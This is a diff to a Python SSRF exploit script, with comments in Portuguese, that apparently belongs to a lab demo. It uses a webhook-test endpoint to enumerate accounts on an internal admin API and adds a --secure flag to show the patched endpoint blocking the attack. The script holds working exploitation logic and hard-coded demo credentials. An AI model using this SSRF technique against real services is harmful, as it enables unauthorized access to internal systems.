@@ -25,6 +25,8 @@ USER, PASSWORD = "joao", "senha123"  # conta comum do atacante
 INTERNAL_API = "10.5.0.15:8080"      # host:porta da API administrativa interna
 # ==========================================================================
 
+MODE = "vulnerable"  # trocado para "secure" com --secure
+
 
 def login() -> str:
     r = httpx.post(f"{APP_URL}/auth/login",
@@ -36,7 +38,7 @@ def login() -> str:
 def ssrf_get(token: str, url: str, timeout: float = 10.0) -> dict:
     start = time.perf_counter()
     try:
-        r = httpx.post(f"{APP_URL}/vulnerable/webhook/test", json={"url": url},
+        r = httpx.post(f"{APP_URL}/{MODE}/webhook/test", json={"url": url},
                        headers={"Authorization": f"Bearer {token}"}, timeout=timeout)
         data = r.json().get("request", {})
     except Exception as exc:  # noqa: BLE001
@@ -67,5 +69,9 @@ def main(internal_api):
 if __name__ == "__main__":
     ap = argparse.ArgumentParser(description="Enumeração de contas via SSRF (API interna).")
     ap.add_argument("--internal-api", default=INTERNAL_API, dest="internal_api")
+    ap.add_argument("--secure", action="store_true",
+                    help="testa contra /secure/webhook/test (mostra o bloqueio)")
     a = ap.parse_args()
+    if a.secure:
+        MODE = "secure"
     main(a.internal_api)
